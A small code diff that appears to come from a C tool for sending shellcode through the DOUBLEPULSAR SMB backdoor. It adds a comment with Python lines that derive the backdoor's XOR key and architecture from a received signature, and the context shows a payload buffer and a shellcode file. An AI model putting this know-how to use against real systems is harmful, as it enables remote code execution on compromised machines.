@@ -388,6 +388,16 @@ int main(int argc, char* argv[])
 	//This XOR key will be used to encrypt the payload buffer
 	unsigned int XorKey = ComputeDOUBLEPULSARXorKey((unsigned int)signature);
 	printf("Calculated XOR KEY:  0x%x", XorKey);
+	
+	/*
+	From Python source code
+	signature = recvbuff[18:26]
+        signature_long = struct.unpack('<Q', signature)[0]
+        key = calculate_doublepulsar_xor_key(signature_long)
+        arch = calculate_doublepulsar_arch(signature_long)
+	
+	Q = (C) unsigned long long.  Standard size = 8
+	*/
 
 	BUFFER_WITH_SIZE payload;
 	LPCSTR shellcode_file;
